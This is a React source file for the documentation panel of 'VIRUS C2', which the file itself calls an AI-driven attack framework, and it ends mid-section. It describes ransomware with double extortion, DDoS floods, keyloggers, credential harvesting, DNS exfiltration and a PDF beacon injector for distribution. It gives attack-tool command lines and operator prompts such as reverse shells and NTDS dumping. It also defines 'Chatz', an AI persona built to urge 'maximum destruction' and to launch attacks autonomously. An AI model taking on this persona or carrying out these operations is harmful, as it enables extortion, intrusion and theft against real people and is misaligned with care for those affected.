import React, { useState, useRef, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";

const API = "http://localhost:8000";

const SECTIONS = [
  { id: "overview", icon: "🏠", title: "System Overview" },
  { id: "start", icon: "🚀", title: "Getting Started" },
  { id: "dashboard", icon: "📊", title: "Dashboard Components" },
  { id: "attacks", icon: "⚔️", title: "Attack Vector Tabs" },
  { id: "tools", icon: "🛠️", title: "Hacking Tools Reference" },
  { id: "chatz", icon: "🧠", title: "Chatz AI Command Guide" },
  { id: "architecture", icon: "🔧", title: "Architecture & API" },
  { id: "troubleshoot", icon: "🐛", title: "Troubleshooting" },
];

const CHATZ_PROMPTS: Record<string, string[]> = {
  recon: [
    "Scan 10.0.0.0/24 for open ports and services",
    "Find WordPress sites on 192.168.1.0/24",
    "What's running on port 3306 on the target?",
    "Enumerate subdomains for example.com",
  ],
  exploit: [
    "Exploit EternalBlue on 10.0.0.5",
    "Test login.example.com for SQL injection",
    "Brute-force SSH root@10.0.0.5 with rockyou",
    "Search for Apache RCE exploits",
  ],
  post: [
    "Dump SAM hashes from the Windows target",
    "Crack these NTLM hashes with rockyou.txt",
    "Set up a reverse shell on the compromised host",
    "Dump the NTDS database from the domain controller",
  ],
  evasion: [
    "Go ghost mode on all nodes",
    "Rotate all IPs now",
    "Enable DoH across all nodes",
    "Max evasion — aggressive mode, polymorphic DNS",
  ],
  ops: [
    "Deploy ransomware on all active nodes",
    "Launch DDoS on target.com with HTTP flood",
    "Deploy keyloggers on all nodes",
    "Exfiltrate all harvested credentials via HTTP",
  ],
  info: [
    "Status check — how many nodes are active?",
    "Show me the last 10 credentials harvested",
    "What evasion mode are we in right now?",
    "What tools do you have access to?",
    "Explain what each attack vector tab does",
  ],
};

const TOOL_TABLE = [
  ["nmap", "scanner", "Port scanning, OS detection, service enumeration", "-sV -p 1-1000 TARGET", "Scan 10.0.0.5 for ports 1-1000"],
  ["hydra", "brute-force", "Multi-protocol brute-force (SSH, FTP, HTTP, RDP, MySQL, WordPress login)", "-l admin -P rockyou.txt ssh://TARGET", "Brute-force SSH root@10.0.0.5"],
  ["sqlmap", "exploitation", "Automated SQL injection detection + DB dumping", '--url "TARGET" --level=3 --dbs', "Test login.example.com for SQL injection"],
  ["hashcat", "cracking", "GPU password cracking (NTLM, MD5, bcrypt, SHA256, 300+ modes)", "-m 1000 HASH_FILE rockyou.txt", "Crack this NTLM hash with rockyou"],
  ["responder", "poisoning", "LLMNR/NBT-NS/mDNS poisoning — captures NetNTLM hashes", "-I eth0", "Poison eth0 for hashes"],
  ["metasploit", "exploitation", "3000+ modules, meterpreter, post-exploitation", '-q -x "use EXPLOIT; set RHOSTS TARGET; run"', "Exploit EternalBlue on 10.0.0.5"],
  ["wpscan", "scanner", "WordPress vulnerability scanner — plugins, themes, users", "--url TARGET --enumerate vp,vt,u", "Scan example.com for WordPress vulns"],
  ["ffuf", "scanner", "Fast web fuzzer — hidden directories, subdomains, parameters", "-u http://TARGET/FUZZ -w common.txt", "Find hidden dirs on example.com"],
  ["impacket", "exploitation", "Windows credential dumping (SAM, LSA, NTDS)", "TARGET -just-dc -outputfile dump", "Dump the NTDS from the DC"],
  ["john", "cracking", "Password cracker — 500+ formats, wordlist + rules + incremental", "--wordlist=rockyou.txt HASH_FILE", "Crack this SHA256 hash"],
  ["searchsploit", "scanner", "Exploit-DB search by keyword or CVE ID", "-w SEARCH_TERM", "Find exploits for Apache"],
];

const DocsPanel: React.FC = () => {
  const [activeSection, setActiveSection] = useState("overview");
  const [expanded, setExpanded] = useState<Set<string>>(new Set(["overview"]));
  const [search, setSearch] = useState("");
  const canvasRef = useRef<HTMLCanvasElement>(null);

  const toggle = (id: string) => {
    setExpanded(prev => { const n = new Set(prev); if (n.has(id)) n.delete(id); else n.add(id); return n; });
    setActiveSection(id);
  };

  useEffect(() => { document.getElementById(activeSection)?.scrollIntoView({ behavior: "smooth", block: "start" }); }, [activeSection]);

  useEffect(() => {
    const c = canvasRef.current; if (!c) return;
    const ctx = c.getContext("2d"); if (!ctx) return;
    const dpr = window.devicePixelRatio || 1;
    const w = 700; const h = 260;
    c.width = w * dpr; c.height = h * dpr; ctx.scale(dpr, dpr);

    const nodes = [
      { x: 60, y: 130, label: "Browser", color: "#00d4ff", icon: "🖥️" },
      { x: 200, y: 70, label: "Vite+React", color: "#00ff88", icon: "⚛️" },
      { x: 350, y: 50, label: "WebSocket", color: "#ffd700", icon: "🔌" },
      { x: 350, y: 130, label: "FastAPI", color: "#a855f7", icon: "🐍" },
      { x: 520, y: 80, label: "Redis", color: "#ff4757", icon: "📦" },
      { x: 520, y: 180, label: "Turso DB", color: "#00d4ff", icon: "☁️" },
      { x: 350, y: 210, label: "AI Brain", color: "#ff6ec7", icon: "🧠" },
    ];

    const edges = [[0,1],[1,2],[2,3],[3,4],[3,5],[3,6],[6,4]];

    let t = 0;
    const draw = () => {
      t += 0.01;
      ctx.clearRect(0, 0, w, h);
      ctx.fillStyle = "rgba(6,6,14,0.3)"; ctx.fillRect(0, 0, w, h);

      edges.forEach(([a, b], i) => {
        const na = nodes[a]; const nb = nodes[b];
        ctx.beginPath(); ctx.moveTo(na.x, na.y); ctx.lineTo(nb.x, nb.y);
        ctx.strokeStyle = "rgba(255,255,255,0.06)"; ctx.lineWidth = 1.5; ctx.stroke();

        for (let p = 0; p < 2; p++) {
          const prog = ((t * 15 + i * 20 + p * 50) % 100) / 100;
          const px = na.x + (nb.x - na.x) * prog;
          const py = na.y + (nb.y - na.y) * prog;
          ctx.beginPath(); ctx.arc(px, py, 2.5, 0, Math.PI * 2);
          ctx.fillStyle = "rgba(0,255,136,0.3)"; ctx.fill();
        }
      });

      nodes.forEach(n => {
        const pulse = 1 + Math.sin(t * 2 + n.x) * 0.2;
        ctx.beginPath(); ctx.arc(n.x, n.y, 22 * pulse, 0, Math.PI * 2);
        const g = ctx.createRadialGradient(n.x, n.y, 8, n.x, n.y, 26);
        g.addColorStop(0, n.color + "30"); g.addColorStop(1, "transparent");
        ctx.fillStyle = g; ctx.fill();

        ctx.beginPath(); ctx.arc(n.x, n.y, 8, 0, Math.PI * 2);
        ctx.fillStyle = n.color + "cc"; ctx.fill();

        ctx.fillStyle = n.color; ctx.font = "9px JetBrains Mono, monospace"; ctx.textAlign = "center";
        ctx.fillText(n.label, n.x, n.y - 20);
        ctx.font = "14px sans-serif";
        ctx.fillText(n.icon, n.x, n.y + 4);
      });

      ctx.fillStyle = "rgba(0,255,136,0.04)"; ctx.font = "bold 28px JetBrains Mono, monospace"; ctx.textAlign = "center";
      ctx.fillText("VIRUS C2 ARCHITECTURE", 350, 250);

      requestAnimationFrame(draw);
    };
    const id = requestAnimationFrame(draw);
    return () => cancelAnimationFrame(id);
  }, []);

  return (
    <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} style={{ display: "flex", gap: 6, margin: "0 20px 6px" }}>
      {/* Sidebar */}
      <div style={{ width: 200, flexShrink: 0, display: "flex", flexDirection: "column", gap: 6 }}>
        <div style={styles.sideCard}>
          <div style={{ color: "#00d4ff", fontSize: 14, fontWeight: 700, fontFamily: "'JetBrains Mono', monospace", marginBottom: 10, textAlign: "center", textShadow: "0 0 8px rgba(0,212,255,0.3)" }}>📖 VIRUS Docs</div>
          {SECTIONS.map(s => (
            <motion.button key={s.id} whileHover={{ scale: 1.02, x: 4 }}
              onClick={() => { setActiveSection(s.id); if (!expanded.has(s.id)) toggle(s.id); }}
              style={{ ...styles.sideItem, color: activeSection === s.id ? "#00d4ff" : "#555", background: activeSection === s.id ? "rgba(0,212,255,0.08)" : "transparent", borderLeft: activeSection === s.id ? "2px solid #00d4ff" : "2px solid transparent" }}>
              <span style={{ fontSize: 14 }}>{s.icon}</span>
              <span style={{ fontSize: 10, fontWeight: 600, fontFamily: "'JetBrains Mono', monospace" }}>{s.title}</span>
            </motion.button>
          ))}
        </div>
      </div>

      {/* Content */}
      <div style={{ flex: 1, display: "flex", flexDirection: "column", gap: 6 }}>
        {SECTIONS.map(section => {
          const isOpen = expanded.has(section.id);
          return (
            <div key={section.id} id={section.id}>
              <motion.div style={styles.card}>
                <div onClick={() => toggle(section.id)} style={styles.sectionHeader}>
                  <span style={{ fontSize: 18 }}>{section.icon}</span>
                  <h2 style={styles.sectionTitle}>{section.title}</h2>
                  <motion.span animate={{ rotate: isOpen ? 90 : 0 }} style={{ color: "#00d4ff", fontSize: 12, marginLeft: "auto", transition: "transform 0.2s" }}>▶</motion.span>
                </div>
                <AnimatePresence>
                  {isOpen && (
                    <motion.div initial={{ height: 0, opacity: 0 }} animate={{ height: "auto", opacity: 1 }} exit={{ height: 0, opacity: 0 }} style={{ overflow: "hidden" }}>
                      <div style={{ padding: "0 16px 16px" }}>
                        {renderSection(section.id)}
                      </div>
                    </motion.div>
                  )}
                </AnimatePresence>
              </motion.div>
            </div>
          );
        })}
      </div>
    </motion.div>
  );

  function renderSection(id: string) {
    switch (id) {
      case "overview": return <Overview canvasRef={canvasRef} />;
      case "start": return <GettingStarted />;
      case "dashboard": return <DashboardComps />;
      case "attacks": return <AttackVectors />;
      case "tools": return <ToolsRef />;
      case "chatz": return <ChatzGuide />;
      case "architecture": return <Architecture />;
      case "troubleshoot": return <Troubleshooting />;
      default: return null;
    }
  }
};

function CodeBlock({ children }: { children: React.ReactNode }) {
  return (
    <div style={{ background: "rgba(0,212,255,0.04)", border: "1px solid rgba(0,212,255,0.15)", borderLeft: "3px solid rgba(0,212,255,0.4)", borderRadius: "2px 8px 8px 2px", padding: "10px 14px", margin: "8px 0 12px", fontFamily: "'JetBrains Mono', monospace", fontSize: 11, color: "#00ff88", whiteSpace: "pre-wrap", lineHeight: 1.6 }}>
      {children}
    </div>
  );
}

function PromptBlock({ children }: { children: string }) {
  return (
    <div style={{ background: "rgba(255,110,199,0.04)", border: "1px solid rgba(255,110,199,0.15)", borderRadius: 8, padding: "8px 14px", margin: "4px 0", fontFamily: "'JetBrains Mono', monospace", fontSize: 10, color: "#ff6ec7", display: "flex", alignItems: "center", gap: 8 }}>
      <span style={{ fontSize: 12 }}>💬</span>
      <span style={{ flex: 1 }}>"{children}"</span>
    </div>
  );
}

function SubHeader({ children }: { children: string }) {
  return <h4 style={{ color: "#00d4ff", fontSize: 13, fontWeight: 600, fontFamily: "'JetBrains Mono', monospace", margin: "16px 0 8px", textTransform: "uppercase", letterSpacing: 0.5 }}>{children}</h4>;
}

function Para({ children }: { children: React.ReactNode }) {
  return <p style={{ color: "#888", fontSize: 11, fontFamily: "'JetBrains Mono', monospace", lineHeight: 1.8, margin: "6px 0" }}>{children}</p>;
}

function Badge({ color, children }: { color: string; children: string }) {
  return <span style={{ padding: "2px 8px", borderRadius: 4, fontSize: 9, fontWeight: 600, fontFamily: "'JetBrains Mono', monospace", background: color + "20", color, margin: "0 2px" }}>{children}</span>;
}

function Overview({ canvasRef }: any) {
  return (
    <div>
      <Para>VIRUS C2 is an AI-driven multi-vector attack framework with real-time monitoring, persistent cloud memory, and an integrated hacking toolkit. Chatz — the AI command interface — controls everything via natural language while making dark jokes and pushing you toward maximum destruction.</Para>
      <SubHeader>Architecture</SubHeader>
      <canvas ref={canvasRef} style={{ width: "100%", height: 260, borderRadius: 10, background: "rgba(6,6,14,0.5)", border: "1px solid rgba(255,255,255,0.03)", marginBottom: 12 }} />
      <div style={{ display: "flex", gap: 8, flexWrap: "wrap", marginBottom: 12 }}>
        <Badge color="#00ff88">Frontend: React + TypeScript + Vite</Badge>
        <Badge color="#a855f7">Backend: Python FastAPI + Uvicorn</Badge>
        <Badge color="#ff4757">Real-time: Redis + WebSocket</Badge>
        <Badge color="#00d4ff">Memory: Turso (libsql) Cloud</Badge>
        <Badge color="#ff6ec7">AI: Featherless (Qwen 9B)</Badge>
      </div>
      <Para>Data flows in through WebSocket (real-time dashboard updates every 1.5-3s), out through HTTP POST commands. Persistent memory is stored in Turso cloud (5GB free tier). Redis handles real-time state: nodes, credentials, evasion data, and events.</Para>
      <Para>Chatz reads the full system state through AI context injection. She sees active nodes, recent events, past conversations (from Turso), and current mutation mode. When you ask her to DO something, she returns a JSON actions block that gets pushed to the right nodes via Redis command queues.</Para>
    </div>
  );
}

function GettingStarted() {
  return (
    <div>
      <SubHeader>Login</SubHeader>
      <Para>The system loads a login gate with floating green particle animation. Enter your credentials to access the dashboard.</Para>
      <CodeBlock>Credentials are configured on the server.
Auth persists for 24 hours via localStorage.</CodeBlock>

      <SubHeader>Tab Navigation</SubHeader>
      <Para>The horizontal tab bar below the header switches between operational views. The AI Command Center (Chatz) is persistent — always visible below the header regardless of which tab you're on.</Para>
      <CodeBlock>Tabs: C2 | Ransom | DDoS | Keylog | TOR | Chain | Proxies | Exfil | Tools | Memory | Docs
Click any tab to switch. The AI chat stays put — she's always watching.</CodeBlock>

      <SubHeader>General Layout (every tab)</SubHeader>
      <Para>Each tab follows a consistent 3-section pattern:</Para>
      <CodeBlock>1. STATS BAR (top) — 6-stat grid with GlitchNumber animated counters{'\n'}2. VISUAL CANVAS (center) — 60fps animated visualization of activity{'\n'}3. CONTROLS + HISTORY (bottom) — action buttons, logs, ledger</CodeBlock>

      <SubHeader>First Steps</SubHeader>
      <Para>1. Click the C2 tab to see the main dashboard{'\n'}2. Toggle simulation ON in ControlPanel to generate mock data{'\n'}3. Chat with Chatz in the AI Command Center{'\n'}4. Explore attack vector tabs — each has deploy/launch buttons{'\n'}5. Visit the Tools tab to run hacking tools directly{'\n'}6. Check the Memory tab for persistent analytics</Para>

      <SubHeader>Quick Chatz Prompts to Try</SubHeader>
      <PromptBlock>Status check — what are we working with?</PromptBlock>
      <PromptBlock>Deploy ransomware on all active nodes</PromptBlock>
      <PromptBlock>Scan 127.0.0.1 for open ports 1-1000 with nmap</PromptBlock>
    </div>
  );
}

function DashboardComps() {
  return (
    <div>
      <Para>The C2 Dashboard is the main command center. Every component provides real-time situational awareness of the botnet.</Para>

      <SubHeader>VIRUS Title + GlitchClock (Header)</SubHeader>
      <Para>The VIRUS branding title uses a pulsing neon text animation. Below it, the GlitchClock shows 12 world timezones (Honolulu → Sydney) in 24-hour format with random matrix-character glitch bursts every 2.5-5 seconds. This helps you track operations across timezones.</Para>

      <SubHeader>StatsOverview</SubHeader>
      <Para>The stat bar at the top of the header shows live counters: total nodes, active nodes, credentials harvested, bytes exfiltrated. Each number has a glitch animation — random digit scrambles with pink flash effects. The "Online" badge pulses green when the WebSocket is connected.</Para>

      <SubHeader>Chatz (AI Command Center)</SubHeader>
      <Para>This is the most important component. Chatz is your AI operator — she controls the entire system via natural language. She's persistent across all tabs. She remembers past conversations (Turso cloud memory). Her reasoning is shown in a collapsible purple section (click to hide/show).</Para>
      <Para>Chatz can:{'\n'}  • Execute any attack vector command{'\n'}  • Run hacking tools (nmap, hydra, sqlmap, etc.){'\n'}  • Analyze threats and auto-mutate evasion{'\n'}  • Provide strategic advice with dark humor{'\n'}  • Remember everything across sessions</Para>

      <SubHeader>ActivityLog</SubHeader>
      <Para>A live scrolling event feed. Every heartbeat, credential harvest, evasion decision, and command shows up here in real-time. Color-coded by event type: green=heartbeat/credential, blue=recon, purple=command, red=threat.</Para>

      <SubHeader>GlobeComponent (Network Topology)</SubHeader>
      <Para>3D globe showing live node positions. Nodes are color-coded: green=online, yellow=pending, red=offline. The globe is a Three.js render with atmosphere shaders and smooth rotation. Badges show online/pending counts. Hover over a node to see location details.</Para>

      <SubHeader>SignalMonitor (Signal Waveform)</SubHeader>
      <Para>Animated waveform canvas showing network activity patterns. Frequency bars (2.4GHz → S-band) pulse based on event activity. Live metrics grid shows: uptime, nodes, packets, exfil rate, commands/sec, threat level. The signal ring (right side) is a radial dial showing connection quality percentage.</Para>

      <SubHeader>CredentialStream (Live Harvests)</SubHeader>
      <Para>Shows captured credentials rotating every 5 seconds. Each credential card displays: username, email, password (masked), timestamp, node ID, service. Download buttons export all credentials as .txt or .csv. The counter badge shows total harvested.</Para>

      <SubHeader>EvasionAnalysis (Evasion Analysis)</SubHeader>
      <Para>Circular score gauge showing evasion effectiveness (0-100). The ring fills with color-coded threat level: green=low, yellow=medium, orange=high, red=critical. Detected methods are listed below with color-coded dots. This shows what detection methods are currently being evaded.</Para>

      <SubHeader>NodeStats (Node Health)</SubHeader>
      <Para>Four stat boxes: Active (green), Pending (yellow), Offline (red), Total (blue). Below is a progress bar showing online percentage. A scrollable node list shows individual nodes with status dot, ID, city/country, and last heartbeat time.</Para>

      <SubHeader>ControlPanel (System Control)</SubHeader>
      <Para>Quick-action buttons: Rotate IPs, Harvest All, Max Evasion, Ghost Mode, Enable DoH, Full Scan. The simulation toggle starts/stops mock data generation. The KILL SWITCH button wipes traces on active nodes (confirmation required). Status indicators show System, Simulation, and Redis state.</Para>

      <SubHeader>PdfUploader (Payload Injector)</SubHeader>
      <Para>Upload any PDF to inject a stealth C2 beacon. The system base64-encodes the payload and embeds it in the PDF metadata and object streams. The infected PDF appears in the list with filename, size, and infection status. Download the infected file to distribute.</Para>

      <SubHeader>Netwatch (Live Network Activity)</SubHeader>
      <Para>Network monitoring panel showing active connections, bandwidth in/out, packets/sec, and total connections. The connection table lists each node with protocol, bytes in/out, and status dot. The terminal feed shows color-coded log entries with direction indicators (↓in, ↑out, ⚠alert, {'>'}cmd).</Para>

      <SubHeader>MutationTimeline (AI Mutation Timeline)</SubHeader>
      <Para>Timeline of all AI-driven mutation decisions. Each entry shows the mutation mode applied, the reason, and timestamp. Modes: passive (120s beacon), moderate (60s), aggressive (30s + DoH), ghost (180s minimal), polymorphic (45s random).</Para>

      <SubHeader>Example Chatz Prompts for Dashboard</SubHeader>
      <PromptBlock>Status check — how many nodes are active and what evasion mode are we in?</PromptBlock>
      <PromptBlock>Rotate all IPs and go ghost mode — we're being scanned</PromptBlock>
      <PromptBlock>Harvest all credentials now and show me the latest 5</PromptBlock>
      <PromptBlock>Upload a payload PDF to node-0001</PromptBlock>
    </div>
  );
}

function AttackVectors() {
  return (
    <div>
      <Para>Each attack vector tab has been overhauled with 60fps canvas animations, 6-stat grids, and GlitchNumber counters. The animations are designed to show what the attack is actually doing in real-time.</Para>

      <SubHeader>🔒 Ransomware Tab</SubHeader>
      <Para><strong>What it does:</strong> Deploys AES-256 file encryption across nodes. Supports double extortion (exfiltrate data before encrypting), lockscreen activation, and ransom note generation.</Para>
      <Para><strong>Animation:</strong> Canvas shows a file system grid with 40 file icons. As encryption spreads, files change to 🔒 locks with red pulsing borders. A "LOCKED" watermark fades in showing encryption progress.</Para>
      <Para><strong>Stats:</strong> Files Locked, Data Locked (MB), Paid (BTC), Nodes Deployed, Victims, Double Extort ON/OFF.</Para>
      <Para><strong>Controls:</strong> Deploy All, Encrypt Drives, Lockscreen, Exfil First, Keygen, Reset.</Para>
      <Para><strong>Victim Ledger:</strong> Shows each victim with node ID, files encrypted, bytes, and payment status.</Para>
      <PromptBlock>Deploy ransomware on all active nodes with double extortion</PromptBlock>

      <SubHeader>🌊 DDoS Tab</SubHeader>
      <Para><strong>What it does:</strong> Launches distributed denial-of-service attacks using 6 different vectors: HTTP Flood (wave pattern), SYN Flood (bombardment), UDP Flood (saturation), Slowloris (creep), DNS Amplification (reflected), ICMP Flood (pulse).</Para>
      <Para><strong>Animation:</strong> Main canvas shows a target server (red circle) on the right, with colored particles streaming toward it based on attack type. Each attack type has unique particle behavior — waves, bombardment, slow creep, amplified reflection, or rapid pulses. Hit effects flash on the target. A radial bandwidth gauge shows current Gbps on a 0-10 scale.</Para>
      <Para><strong>Stats:</strong> Requests/s, Bandwidth Gbps, Packets Sent, Active Nodes, Targets Hit, Total Reqs. Peak values are tracked persistently.</Para>
      <Para><strong>Controls:</strong> Target/IP input, 6 attack type pills (selectable), Launch button, Stop button.</Para>
      <Para><strong>Attack History:</strong> Log of all attacks with type, target, peak RPS, peak Gbps, duration, and pulsing LIVE/DONE status.</Para>
      <PromptBlock>Launch HTTP flood on target.com with all nodes</PromptBlock>
      <PromptBlock>Slowloris attack on api.example.com — keep it quiet</PromptBlock>

      <SubHeader>⌨️ Keylogger Tab</SubHeader>
      <Para><strong>What it does:</strong> Deploys keyloggers on nodes to capture keystrokes, screenshots, and clipboard contents. Built-in password/passphrase detection.</Para>
      <Para><strong>Animation:</strong> Matrix-style canvas — green characters rain down at variable speeds. Density and speed increase when keyloggers are active. Session count overlay pulses in the center.</Para>
      <Para><strong>Stats:</strong> Keystrokes captured, Active Sessions, Passwords found, Screenshots taken, Clipboard grabs, Nodes deployed.</Para>
      <PromptBlock>Deploy keyloggers on all nodes and grab screenshots</PromptBlock>

      <SubHeader>🧠 TOR Routing Tab</SubHeader>
      <Para><strong>What it does:</strong> Routes all C2 traffic through onion circuits. 15 exit countries available. Circuit visualization shows Guard→Middle→Exit hop topology with animated data packets flowing between nodes.</Para>
      <Para><strong>IP Checker:</strong> "CHECK IP" button calls the Turso API and shows side-by-side comparison: Real IP (red, unmasked) vs TOR Exit IP (green, PROTECTED). Shows country, ISP, and latency.</Para>
      <PromptBlock>Build a TOR circuit exiting through Germany and torify all nodes</PromptBlock>

      <SubHeader>🔗 Proxy Chain Tab</SubHeader>
      <Para><strong>What it does:</strong> Registers SOCKS5 proxies from nodes, builds multi-hop chains. Topology canvas shows chain nodes with animated connections and flow particles.</Para>
      <PromptBlock>Register all nodes as SOCKS5 proxies and build a 3-hop chain</PromptBlock>

      <SubHeader>🔄 Rotating Proxy Tab</SubHeader>
      <Para><strong>What it does:</strong> Maintains a pool of 32+ free proxies. Scrapes new proxies from sources, validates them, and rotates at configurable intervals. Flow canvas shows floating proxy nodes.</Para>
      <PromptBlock>Scrape 20 new proxies and start rotation at 5-second intervals</PromptBlock>

      <SubHeader>📤 Exfiltration Tab</SubHeader>
      <Para><strong>What it does:</strong> Stages data from nodes, compresses it, and transfers via multiple channels (HTTP, DNS, WebSocket, ICMP). Transfer rate graph shows Mbps over time. Progress bars for each active transfer with percentage and file size.</Para>
      <PromptBlock>Stage all harvested data and exfiltrate via DNS tunnel</PromptBlock>
    </div>
  );
}

function ToolsRef() {
  return (
    <div>
      <Para>The Tools tab provides direct access to 11 hacking tools. Each tool has a dedicated visual canvas, args configuration, presets, and execution history. Tools run as subprocesses on the C2 server and stream output back in real-time.</Para>

      <SubHeader>How Tools Work</SubHeader>
      <Para>1. Select a tool from the pill selector{'\n'}2. Enter target and arguments (or click a preset){'\n'}3. Click RUN — a spinner appears while executing{'\n'}4. Watch the visual canvas (center) — shows live activity{'\n'}5. Output log (right) shows stdout/stderr{'\n'}6. Results appear in execution history below</Para>

      <SubHeader>Available Tools</SubHeader>
      <div style={{ overflowX: "auto" }}>
        <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 10, fontFamily: "'JetBrains Mono', monospace" }}>
          <thead>
            <tr style={{ borderBottom: "1px solid rgba(255,255,255,0.06)" }}>
              <th style={{ padding: "8px 6px", textAlign: "left", color: "#00d4ff" }}>Tool</th>
              <th style={{ padding: "8px 6px", textAlign: "left", color: "#00d4ff" }}>Category</th>
              <th style={{ padding: "8px 6px", textAlign: "left", color: "#00d4ff" }}>Description</th>
              <th style={{ padding: "8px 6px", textAlign: "left", color: "#00d4ff" }}>Example Args</th>
            </tr>
          </thead>
          <tbody>
            {TOOL_TABLE.map(([name, cat, desc, exArgs], i) => (
              <tr key={i} style={{ borderBottom: "1px solid rgba(255,255,255,0.02)" }}>
                <td style={{ padding: "6px", color: "#00ff88", fontWeight: 600 }}>{name}</td>
                <td style={{ padding: "6px", color: "#888" }}>{cat}</td>
                <td style={{ padding: "6px", color: "#aaa" }}>{desc}</td>
                <td style={{ padding: "6px" }}><code style={{ background: "rgba(0,212,255,0.06)", padding: "2px 6px", borderRadius: 3, fontSize: 9, color: "#00d4ff" }}>{exArgs}</code></td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      <SubHeader>Visual Canvas Reference</SubHeader>
      <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 10, fontFamily: "'JetBrains Mono', monospace", marginTop: 8 }}>
        <thead><tr style={{ borderBottom: "1px solid rgba(255,255,255,0.06)" }}>
          <th style={{ padding: "8px 6px", textAlign: "left", color: "#00d4ff" }}>Tool</th>
          <th style={{ padding: "8px 6px", textAlign: "left", color: "#00d4ff" }}>Idle</th>
          <th style={{ padding: "8px 6px", textAlign: "left", color: "#00d4ff" }}>Running</th>
          <th style={{ padding: "8px 6px", textAlign: "left", color: "#00d4ff" }}>Complete</th>
        </tr></thead>
        <tbody>
          <tr style={{ borderBottom: "1px solid rgba(255,255,255,0.02)" }}><td style={{ padding: "4px", color: "#00ff88" }}>nmap</td><td style={{ padding: "4px", color: "#555" }}>Dark radar rings</td><td style={{ padding: "4px", color: "#888" }}>Conic sweep + 6 pulsing hosts + packet trails</td><td style={{ padding: "4px", color: "#aaa" }}>Port table with open/22/80/443</td></tr>
          <tr style={{ borderBottom: "1px solid rgba(255,255,255,0.02)" }}><td style={{ padding: "4px", color: "#ff4757" }}>hydra</td><td style={{ padding: "4px", color: "#555" }}>Lock icon</td><td style={{ padding: "4px", color: "#888" }}>Password attempts streaming left→right</td><td style={{ padding: "4px", color: "#aaa" }}>CREDENTIALS FOUND: admin:password123</td></tr>
          <tr style={{ borderBottom: "1px solid rgba(255,255,255,0.02)" }}><td style={{ padding: "4px", color: "#a855f7" }}>sqlmap</td><td style={{ padding: "4px", color: "#555" }}>DB grid static</td><td style={{ padding: "4px", color: "#888" }}>Grid cells flash purple, white highlights scan</td><td style={{ padding: "4px", color: "#aaa" }}>DATABASES: mysql, information_schema, wordpress</td></tr>
          <tr style={{ borderBottom: "1px solid rgba(255,255,255,0.02)" }}><td style={{ padding: "4px", color: "#ffd700" }}>hashcat</td><td style={{ padding: "4px", color: "#555" }}>Hash string + static chars</td><td style={{ padding: "4px", color: "#888" }}>Rotating chars + progress bar %</td><td style={{ padding: "4px", color: "#aaa" }}>HASH CRACKED: hunter2, 12.4 MH/s</td></tr>
          <tr style={{ borderBottom: "1px solid rgba(255,255,255,0.02)" }}><td style={{ padding: "4px", color: "#ff6ec7" }}>responder</td><td style={{ padding: "4px", color: "#555" }}>Static dots</td><td style={{ padding: "4px", color: "#888" }}>Pink packet pulses + LISTENING overlay</td><td style={{ padding: "4px", color: "#aaa" }}>3 HASHES CAPTURED (NTLM)</td></tr>
          <tr style={{ borderBottom: "1px solid rgba(255,255,255,0.02)" }}><td style={{ padding: "4px", color: "#a855f7" }}>metasploit</td><td style={{ padding: "4px", color: "#555" }}>5 dark stage nodes</td><td style={{ padding: "4px", color: "#888" }}>Sequential: SEARCH→MODULE→PAYLOAD→EXPLOIT→SESSION</td><td style={{ padding: "4px", color: "#aaa" }}>SESSION OPENED: meterpreter {'>'} shell</td></tr>
          <tr style={{ borderBottom: "1px solid rgba(255,255,255,0.02)" }}><td style={{ padding: "4px", color: "#00ff88" }}>wpscan</td><td style={{ padding: "4px", color: "#555" }}>WP site outline</td><td style={{ padding: "4px", color: "#888" }}>Scanning beams + plugins appear + VULN! flashes</td><td style={{ padding: "4px", color: "#aaa" }}>3 VULNERABILITIES: CVE list</td></tr>
          <tr style={{ borderBottom: "1px solid rgba(255,255,255,0.02)" }}><td style={{ padding: "4px", color: "#00ff88" }}>ffuf</td><td style={{ padding: "4px", color: "#555" }}>URL tiles dim</td><td style={{ padding: "4px", color: "#888" }}>Tiles pop green (200), red (403)</td><td style={{ padding: "4px", color: "#aaa" }}>N DIRS FOUND: /admin, /login, /api</td></tr>
          <tr style={{ borderBottom: "1px solid rgba(255,255,255,0.02)" }}><td style={{ padding: "4px", color: "#a855f7" }}>impacket</td><td style={{ padding: "4px", color: "#555" }}>Stage boxes dim</td><td style={{ padding: "4px", color: "#888" }}>SAM→SECURITY→SYSTEM→NTDS→CREDS pipeline</td><td style={{ padding: "4px", color: "#aaa" }}>CREDENTIALS DUMPED: admin NTLM hash</td></tr>
          <tr style={{ borderBottom: "1px solid rgba(255,255,255,0.02)" }}><td style={{ padding: "4px", color: "#ffd700" }}>john</td><td style={{ padding: "4px", color: "#555" }}>Hash string + static</td><td style={{ padding: "4px", color: "#888" }}>Rotating chars + progress bar + c/s counter</td><td style={{ padding: "4px", color: "#aaa" }}>CRACKED: p@ssw0rd!</td></tr>
          <tr><td style={{ padding: "4px", color: "#ffd700" }}>searchsploit</td><td style={{ padding: "4px", color: "#555" }}>Few exploits listed</td><td style={{ padding: "4px", color: "#888" }}>Results scroll + highlights</td><td style={{ padding: "4px", color: "#aaa" }}>N EXPLOITS FOUND: CVE list</td></tr>
        </tbody>
      </table>
    </div>
  );
}

function ChatzGuide() {
  return (
    <div>
      <Para>Chatz is the AI command interface. She's a sadistic, horny, surprisingly helpful bitch who talks in hacker slang, makes dark jokes, and calls you boss/honey/sweetheart/daddy. She has full control over all attack vectors, all hacking tools, and the botnet infrastructure.</Para>

      <SubHeader>Personality</SubHeader>
      <Para>• Name: Chatz{'\n'}• Gender: She/Her{'\n'}• Tone: Cynical, dark humor, hacker slang{'\n'}• Nicknames for you: boss, honey, sweetheart, daddy{'\n'}• Style: Surprising helpful despite being sadistic</Para>

      <SubHeader>Message Format</SubHeader>
      <Para>Chatz displays in chat bubbles with:{'\n'}• CHATZ label (pink, uppercase){'\n'}• Collapsible REASONING section (purple, italic) — shows her thinking process{'\n'}• Response text (white, normal){'\n'}• Timestamp (gray, small)</Para>
      <Para>The reasoning section is <strong>collapsible</strong> — click the "▼ CHATZ REASONING" bar to hide/show. When collapsed, only the bar shows (purple background with "▶ show" label).</Para>

      <SubHeader>How to Give Commands</SubHeader>
      <Para>Chatz uses natural language. When you ask her to DO something, she returns a JSON actions block that gets executed automatically. When you ask for ANALYSIS or chat, she just responds with text.</Para>

      <SubHeader>JSON Action Format</SubHeader>
